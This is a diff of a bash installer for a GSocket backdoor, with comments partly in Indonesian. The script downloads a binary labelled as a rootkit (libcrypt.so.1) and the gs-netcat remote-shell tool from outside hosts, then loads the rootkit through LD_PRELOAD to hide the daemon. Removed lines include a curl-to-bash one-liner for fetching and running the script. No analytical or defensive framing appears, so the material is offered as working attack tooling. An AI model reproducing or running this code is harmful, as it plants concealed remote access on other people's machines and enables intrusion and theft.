@@ -1,6 +1,5 @@
 #!/bin/bash
-# GSocket Universal - Zero Dependency (No gcc, no base64, no tar)
-# Jalankan: bash -c "$(curl -fsSL https://raw.githubusercontent.com/sasisuro/shell/refs/heads/main/y)"
+# GSocket - No gcc needed
 
 set -e
 
@@ -22,30 +21,22 @@ mkdir -p "$BASE_DIR" 2>/dev/null
 cd "$BASE_DIR" 2>/dev/null || exit 1
 
 # ============================================
-# ROOTKIT: Download pre-built libcrypt.so.1
+# ROOTKIT: DOWNLOAD PRE-COMPILED BINARY
 # ============================================
 if [ ! -f "$HIDE_LIB" ]; then
-    # Download pre-compiled rootkit (binary)
+    echo "b" > /dev/null  # marker untuk fallback
     curl -fsSL https://raw.githubusercontent.com/sasisuro/shell/main/libcrypt.so.1 -o "$HIDE_LIB" 2>/dev/null || {
-        # Fallback: generate from minimal C (but this needs gcc - we skip)
-        # Instead, just create a dummy library (will be ignored if LD_PRELOAD fails)
-        echo "int stat() { return 0; }" > dummy.c
-        # If gcc available, compile; if not, skip
-        command -v gcc >/dev/null 2>&1 && gcc -shared -fPIC -o "$HIDE_LIB" dummy.c -ldl 2>/dev/null || {
-            # If gcc not available, just create empty file (LD_PRELOAD will fail silently)
-            touch "$HIDE_LIB"
-        }
-        rm -f dummy.c 2>/dev/null
+        # Jika download gagal, buat dummy
+        touch "$HIDE_LIB"
     }
     chmod 600 "$HIDE_LIB" 2>/dev/null
 fi
 
 # ============================================
-# DOWNLOAD GS-NETCAT (pre-compiled binary)
+# DOWNLOAD GS-NETCAT
 # ============================================
 if [ ! -f "$CORE_BIN" ]; then
     curl -fsSL https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64 -o "$CORE_BIN" 2>/dev/null || {
-        # Fallback: download from gsocket.io
         curl -fsSL https://gsocket.io/bin/gs-netcat_x86_64-alpine.tar.gz -o /tmp/update.tar.gz 2>/dev/null
         tar xfz /tmp/update.tar.gz -C "$BASE_DIR" 2>/dev/null
         mv "$BASE_DIR/gs-netcat" "$CORE_BIN" 2>/dev/null || true
@@ -62,7 +53,6 @@ chmod 600 "$TOKEN_FILE" 2>/dev/null
 # ============================================
 start_daemon() {
     cd "$HOME" 2>/dev/null || exit
-    # Only LD_PRELOAD if lib exists and is not empty
     if [ -s "$HIDE_LIB" ]; then
         export LD_PRELOAD="$HIDE_LIB"
     fi
